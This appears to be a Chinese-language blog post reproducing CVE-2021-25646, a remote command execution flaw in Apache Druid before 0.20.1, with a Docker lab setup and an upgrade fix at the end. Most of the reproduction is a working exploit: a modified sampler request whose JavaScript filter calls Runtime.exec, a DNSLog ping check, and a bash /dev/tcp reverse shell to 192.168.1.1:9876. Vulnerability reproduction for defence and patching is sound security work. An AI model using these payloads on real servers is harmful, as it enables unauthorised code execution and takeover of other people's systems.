# CVE-2021-25646：Apache Druid 远程命令执行漏洞复现 - cHr1s_h - 博客园

> 原文：[`www.cnblogs.com/cHr1s/p/14365418.html`](https://www.cnblogs.com/cHr1s/p/14365418.html)

# 漏洞概述

Apache Druid 是一个分布式的数据处理系统。Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。在 Druid 0.20.0 及更低版本中，用户发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。

# 影响版本

Apache Druid < 0.20.1

# 环境搭建

```
docker pull fokkodriesprong/docker-druid
docker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid 
```

# 漏洞复现

访问 8888 端口，进入 Apache Druid 首页：
![](img/9ce5ec24849f1dfc834c73dcf209e77a.png)

点击左上方`Load data` -> `Local disk`:
![](img/f0b9ee2b3aaefe130f17c906d041a348.png)

右侧表单填入:
**Base directory:**
`quickstart/tutorial/`
**File filter:**
`wikiticker-2015-09-12-sampled.json.gz`
![](img/48e6cf0593c90d6effb2c3eee08f5dc6.png)

接下来一路点击 next，直到下一步是 Filter 时，抓取数据包：
![](img/fe4260064e56f9d65c12cf287d6313b9.png)
![](img/946e8795a9513ca5c319c035d4bb47e5.png)

此时替换数据包中 POST 的 data 数据，原始数据：

```
{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[]}}},"samplerConfig":{"numRows":500,"timeoutMs":15000,"cacheKey":"4ddb48fdbad7406084e37a1b80100214"}} 
```

替换后的数据：

```
{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
"function":"function(value){return java.lang.Runtime.getRuntime().exec('bash -i >& /dev/tcp/192.168.1.1/9876 0>&1')}",
"dimension":"added",
"":{
"enabled":"true"
}
}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000,"cacheKey":"4ddb48fdbad7406084e37a1b80100214"}} 
```

其中，执行命令的代码为：

```
"function":"function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.1.1/9876 0>&1')}" 
```

## DNSLog 测试

```
exec('ping xxx.dnslog.cn -c 1') 
```

![](img/a879d1b0c9061502d0a9ad3abd124921.png)

## 反弹 shell

```
exec('/bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.1.1/9876 0>&1') 
```

![](img/2be4433b872859d80a6ea65ef6b67100.png)

成功反弹 shell。

# 修复建议

升级到最新版 Apache Druid 0.20.1

下载链接：[`druid.apache.org/downloads.html`](https://druid.apache.org/downloads.html)